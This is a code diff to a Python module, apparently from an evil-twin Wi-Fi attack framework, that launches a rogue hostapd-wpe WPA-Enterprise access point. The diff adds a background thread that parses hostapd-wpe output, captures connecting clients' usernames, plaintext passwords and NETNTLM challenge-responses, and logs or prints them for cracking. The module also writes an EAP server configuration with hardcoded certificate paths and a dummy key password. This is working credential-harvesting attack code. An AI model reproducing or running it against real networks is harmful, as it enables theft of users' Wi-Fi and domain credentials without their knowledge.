@@ -1,10 +1,9 @@
-
 import os
 import pyric.pyw as pyw
 from etfexceptions import InvalidConfigurationException
 from utils.utils import FileHandler, DEVNULL
 from netaddr import EUI, OUI
-from subprocess import Popen, check_output
+from subprocess import Popen, PIPE, check_output
 from textwrap import dedent
 from threading import Thread
 from utils.utils import FileHandler, DEVNULL
@@ -23,6 +22,7 @@ class APLauncher(object):
 		self.connected_clients = []
 
 		self.file_handler = None
+		self.print_creds = False
 
 	# TODO: Add support for multiple SSIDs! 
 	def write_hostapd_configurations(self,  interface="wlan0", 
@@ -111,12 +111,12 @@ class APLauncher(object):
 			
 
 	def _get_wpa_eap_configurations(self, configurations):
-		configurations = "eap_user_file=utils/hostapd-2.2/hostapd/hostapd-wpe.eap_user\n"
-		configurations += "ca_cert=utils/hostapd-2.2/certs/certnew.cer\n"
-		configurations += "server_cert=utils/hostapd-2.2/certs/server.pem\n"
-		configurations += "private_key=utils/hostapd-2.2/certs/server.pem\n"
+		configurations = "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\n"
+		configurations += "ca_cert=/etc/hostapd-wpe//certs/certnew.cer\n"
+		configurations += "server_cert=/etc/hostapd-wpe/certs/server.crt\n"
+		configurations += "private_key=/etc/hostapd-wpe/certs/server.pem\n"
 		configurations += "private_key_passwd=whatever\n"
-		configurations += "dh_file=utils/hostapd-2.2/certs/dh\n"
+		configurations += "dh_file=/etc/hostapd-wpe/certs/dh\n"
 		configurations += "eap_server=1\n"
 		configurations += "eap_fast_a_id=101112131415161718191a1b1c1d1e1f\n"
 		configurations += "eap_fast_a_id_info=hostapd-wpe\n"
@@ -125,7 +125,7 @@ class APLauncher(object):
 		configurations += "pac_key_lifetime=604800\n"
 		configurations += "pac_key_refresh_time=86400\n"
 		configurations += "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\n"
-		configurations += "wpe_logfile=./data/hashes/eap_hashes{}.log\n".format(self._count_hash_captures())
+		#configurations += "wpe_logfile=./data/hashes/eap_hashes{}.log\n".format(self._count_hash_captures())
 		configurations += "auth_algs=3\n"
 		return configurations
 
@@ -139,13 +139,52 @@ class APLauncher(object):
 
 	def start_access_point(self, interface):
 		print "[+] Starting hostapd background process"
-		self.ap_process = Popen("utils/hostapd-2.2/hostapd/hostapd-wpe -s {config_path}".format( config_path=self.hostapd_config_path).split(), 
-								stdout=DEVNULL,
-								stderr=DEVNULL)
+		self.ap_process = Popen("hostapd-wpe -s {config_path}".format( config_path=self.hostapd_config_path).split(), 
+								stdout=PIPE,
+								stderr=PIPE,
+								universal_newlines=True)
+		Thread(	target=self._async_cred_logging, 
+				args=(	"./data/hashes/eap_hashes{}.log".format(self._count_hash_captures()), 
+						self.print_creds)).start()
 
 		self.ap_running = True
 		self.connected_clients_updator = Thread(target=self.update_connected_clients, args=(interface, ))
 		self.connected_clients_updator.start()
+
+	def _async_cred_logging(self, log_file, print_creds=False):
+		"""
+		This method checks for credentials in hostapd-wpe output
+		"""
+		log_file = open(log_file, "a")
+		output_lines = iter(self.ap_process.stdout.readline, "")
+		incoming_cred = False
+		username = ""
+		password = ""
+		jtr_challenge_response = ""
+		for line in output_lines:
+			if "username:" in line:
+				incoming_cred = True
+				username = line.split("username:")[-1].strip()
+
+			if "password:" in line and incoming_cred:
+				incoming_cred = False
+				password = line.split("password:")[-1].strip()
+				cred_string = username + ":" + password + "\n"
+				log_file.write(cred_string)
+				if print_creds:
+					print cred_string
+
+			if "NETNTLM:" in line:
+				incoming_cred = False
+				jtr_challenge_response = line.split("NETNTLM:")[-1].strip()
+				log_file.write(jtr_challenge_response + "\n")
+				if print_creds:
+					print jtr_challenge_response + "\n"
+
+		try:
+			log_file.close()
+			self.ap_process.stdout.close()
+		except: pass
 
 	def stop_access_point(self, wait = True):
 		if self.ap_process != None:
